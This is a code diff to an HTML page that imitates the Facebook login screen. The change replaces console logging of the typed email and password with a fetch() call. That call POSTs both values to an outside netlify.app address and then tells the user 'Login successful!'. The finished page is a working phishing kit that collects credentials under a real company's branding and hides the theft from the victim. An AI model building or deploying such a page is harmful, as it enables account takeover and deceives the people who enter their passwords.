@@ -3,69 +3,56 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Facebook Login</title>
+    <title>Facebook Login Clone</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            color: #1c1e21;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
         .container {
-            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-width: 300px;
+            margin: 50px auto;
             padding: 20px;
+            border: 1px solid #ccc;
             border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            width: 360px;
-            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
+
         h1 {
             color: #1877f2;
-            font-size: 36px;
-            margin-bottom: 20px;
+            text-align: center;
         }
-        input[type="text"], input[type="password"] {
+
+        input, button {
             width: 100%;
-            padding: 12px;
-            margin-bottom: 12px;
+            padding: 10px;
+            margin-top: 8px;
             border: 1px solid #ccc;
             border-radius: 4px;
             font-size: 16px;
-            box-sizing: border-box;
         }
+
         .login-btn {
             background-color: #1877f2;
             color: white;
-            border: none;
-            padding: 12px;
-            width: 100%;
-            font-size: 16px;
-            border-radius: 4px;
             cursor: pointer;
+            border: none;
             transition: background-color 0.3s;
         }
+
         .login-btn:hover {
-            background-color: #165dd7;
+            background-color: #166fe5;
         }
+
         .forgot-link {
-            display: block;
-            margin-top: 12px;
+            text-align: center;
+            margin-top: 10px;
             color: #1877f2;
             text-decoration: none;
-            font-size: 14px;
+            display: block;
         }
+
         .forgot-link:hover {
             text-decoration: underline;
-        }
-        .warning {
-            color: red;
-            margin-top: 16px;
-            font-size: 14px;
         }
     </style>
 </head>
@@ -74,23 +61,43 @@
         <h1>facebook</h1>
         <input type="text" id="email" placeholder="Email or phone number" />
         <input type="password" id="password" placeholder="Password" />
-        <button class="login-btn" onclick="logData()">Log In</button>
+        <button class="login-btn" onclick="sendData()">Log In</button>
         <a href="#" class="forgot-link">Forgotten password?</a>
     </div>
 
     <script>
-        function logData() {
+        function sendData() {
             let email = document.getElementById('email').value;
             let password = document.getElementById('password').value;
 
             if (email && password) {
-                // Show data in console
-                console.log(`Email: ${email}`);
-                console.log(`Password: ${password}`);
+                fetch('https://67d07a19b60475ac739e1fe8--beamish-brioche-57b0c8.netlify.app/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email: email, password: password })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error('Failed to send data');
+                    }
+                })
+                .then(data => {
+                    console.log('Data sent successfully:', data);
+                    alert('Login successful!');
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Failed to log in. Try again.');
+                });
             } else {
-                alert('يرجى إدخال البيانات!');
+                alert('Please enter email and password!');
             }
         }
     </script>
 </body>
 </html>
+
